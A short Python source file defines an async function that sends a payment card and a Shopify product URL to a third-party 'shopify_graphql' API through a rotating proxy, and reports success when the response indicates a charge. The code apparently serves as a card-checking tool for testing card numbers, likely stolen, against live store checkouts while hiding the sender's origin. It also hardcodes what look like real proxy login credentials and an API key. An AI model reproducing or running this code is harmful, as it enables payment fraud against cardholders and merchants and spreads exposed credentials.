import httpx
from httpx import AsyncHTTPTransport

async def check_and_add_site(
    card,
    site_url,
    email=None,
    proxy="http://purevpn0s9161585:E7n0nNSvISnTr7@prox-au.pointtoserver.com:10799",
    shipping=False
):
    url = "https://api.voidapi.xyz/v2/shopify_graphql"

    # Async transport with authenticated proxy
    transport = AsyncHTTPTransport(proxy=proxy)

    # Raw proxy string for API payload
    raw_proxy = "prox-au.pointtoserver.com:10799:purevpn0s9161585:E7n0nNSvISnTr7"

    payload = {
        "key": "VDX-SHA2X-NZ0RS-O7HAM",
        "data": {
            "card": card,
            "product_url": site_url,
            "email": email,  # stays None if not provided
            "proxy": raw_proxy,
            "ship_address": None,
            "is_shippable": shipping
        }
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        async with httpx.AsyncClient(transport=transport, timeout=30) as client:
            response = await client.post(url, json=payload, headers=headers)
            data = response.json()

            status = data.get("status", "").lower()
            msg = data.get("message") or data.get("response") or data.get("error") or "No response"

            if "processedreceipt" in status or "charged" in msg.lower():
                return True, msg, data
            else:
                return False, msg, data

    except Exception as e:
        return False, f"Request failed: {e}", {}
